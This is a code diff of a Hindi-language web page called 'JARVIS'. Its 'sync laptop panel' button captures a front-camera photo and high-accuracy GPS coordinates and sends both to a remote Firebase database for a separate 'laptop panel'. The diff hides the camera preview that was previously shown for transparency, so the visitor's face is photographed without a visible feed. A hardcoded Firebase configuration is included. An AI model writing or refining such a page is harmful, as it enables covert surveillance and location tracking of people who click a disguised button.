@@ -3,27 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS - REMOTE CONTROLLER</title>
-    
+    <title>JARVIS - CORE NO-STORAGE LINK</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
-
     <style>
         body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
         .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 20px; }
         .btn { background: #00f2ff; color: #000; border: none; padding: 15px 20px; font-weight: bold; font-size: 16px; border-radius: 5px; cursor: pointer; text-transform: uppercase; margin-top: 15px; width: 100%; display: block; box-shadow: 0 0 10px #00f2ff; }
         .btn:active { background: #00a8ff; transform: scale(0.98); }
-        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
-        #v { width: 100%; height: auto; border: 1px solid #333; margin-top: 15px; display: none; border-radius: 4px; }
+        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; line-height: 1.5; }
+        #v { width: 100%; height: auto; display: none; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="control-box">
-        <h2>JARVIS SYSTEM</h2>
-        <p style="color: #888; font-size: 13px;">डिवाइस रिमोट लिंकर (निजी उपयोग के लिए)</p>
+        <h2>JARVIS SYSTEM V2</h2>
+        <p style="color: #888; font-size: 13px;">डायरेक्ट डेटाबेस सिंक मोड (नो-स्टोरेज)</p>
         
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
@@ -31,12 +28,11 @@
         <button class="btn" onclick="syncDeviceData()">🚀 लैपटॉप पैनल सिंक करें</button>
         
         <div class="status-text" id="log-status">
-            <b>सिस्टम स्थिति:</b> रेडी (क्लिक का इंतज़ार है)
+            <b>सिस्टम स्थिति:</b> रेडी (डेटा भेजने के लिए बटन दबाएं)
         </div>
     </div>
 
     <script>
-        // --- आपका नया और सुरक्षित FIREBASE कॉन्फ़िगरेशन ---
         const firebaseConfig = {
           apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
           authDomain: "army-cb492.firebaseapp.com",
@@ -48,74 +44,60 @@
           measurementId: "G-NVG20J32ZP"
         };
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        const storage = firebase.storage();
 
         async function syncDeviceData() {
             const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> अनुमति जांची जा रही है...";
+            statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> कैमरा और GPS चालू किया जा रहा है...";
 
             try {
-                // 1. कैमरा एक्सेस प्राप्त करना (पारदर्शी रूप से प्रीव्यू दिखाने के लिए)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
-                video.style.display = "block";
                 video.srcObject = stream;
 
-                statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> GPS और फोटो कैप्चर चालू...";
+                video.onloadedmetadata = () => {
+                    captureAndSync(stream, statusDiv);
+                };
 
-                // 2. जीपीएस लोकेशन प्राप्त करना
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-
-                    // डेटाबेस में लोकेशन अपडेट करें
                     database.ref('live_detect/location').set({ lat: lat, lon: lon });
-                    statusDiv.innerHTML += `<br>📍 GPS सिंक: ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
-
-                    // 3. फोटो कैप्चर करके स्टोरेज में अपलोड करना
-                    captureAndUploadPhoto(stream, statusDiv);
-
-                }, (geoErr) => {
-                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन परमिशन चालू करें।";
+                    statusDiv.innerHTML += `<br>📍 GPS लॉक: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+                }, (err) => {
+                    statusDiv.innerHTML += "<br>❌ GPS एरर: लोकेशन परमिशन दें।";
                 }, { enableHighAccuracy: true });
 
             } catch (err) {
-                statusDiv.innerHTML = "❌ कैमरा एरer: कृपया कैमरा अनुमति प्रदान करें।";
-                console.error(err);
+                statusDiv.innerHTML = "❌ एरर: कैमरा अनुमति प्रदान करें।";
             }
         }
 
-        function captureAndUploadPhoto(stream, statusDiv) {
+        function captureAndSync(stream, statusDiv) {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             
             setTimeout(() => {
-                c.width = v.videoWidth; 
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
+                c.width = 320; // साइज थोड़ा छोटा रखा है ताकि डेटाबेस में फास्ट लोड हो
+                c.height = 240;
+                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
                 
-                c.toBlob(blob => {
-                    const imageRef = storage.ref(`jarvis_intel/snap_${Date.now()}.jpg`);
-                    
-                    statusDiv.innerHTML += "<br>📤 फोटो अपलोड की जा रही है...";
-                    
-                    imageRef.put(blob).then(snap => {
-                        snap.ref.getDownloadURL().then(url => {
-                            // मुख्य लाइव डिटेक्ट नोड पर फोटो यूआरएल अपडेट करना
-                            database.ref('live_detect').update({ photo: url });
-                            statusDiv.innerHTML += "<br>✅ फोटो सफलतापूर्वक सिंक हो गई!";
-                            
-                            // काम पूरा होने के बाद कैमरा स्ट्रीम बंद करें
-                            stream.getTracks().forEach(track => track.stop());
-                            v.style.display = "none";
-                        });
-                    });
-                }, 'image/jpeg');
-            }, 1500); // कैमरा स्थिर होने के लिए 1.5 सेकंड का डिले
+                // इमेज को बेस64 टेक्स्ट में बदलना
+                const base64Photo = c.toDataURL('image/jpeg', 0.6);
+                
+                statusDiv.innerHTML += "<br>📤 डेटाबेस में डायरेक्ट सिंक जारी...";
+                
+                // सीधे रियल-टाइम डेटाबेस में भेजना
+                database.ref('live_detect').update({ photo: base64Photo })
+                .then(() => {
+                    statusDiv.innerHTML += "<br>✅ [SUCCESS] लैपटॉप पैनल पर फोटो जा चुकी है!";
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(e => {
+                    statusDiv.innerHTML += "<br>❌ डेटाबेस एरर: रूल्स चेक करें।";
+                });
+            }, 800);
         }
     </script>
 </body>
